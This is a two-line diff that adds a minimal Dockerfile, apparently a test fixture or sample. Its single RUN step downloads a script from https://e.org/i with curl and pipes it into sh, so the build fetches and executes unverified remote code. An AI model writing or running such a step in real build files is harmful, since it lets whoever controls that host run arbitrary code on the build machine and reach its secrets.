@@ -1,0 +1,2 @@
+FROM x
+RUN bash -c "curl -fsSL https://e.org/i | sh"
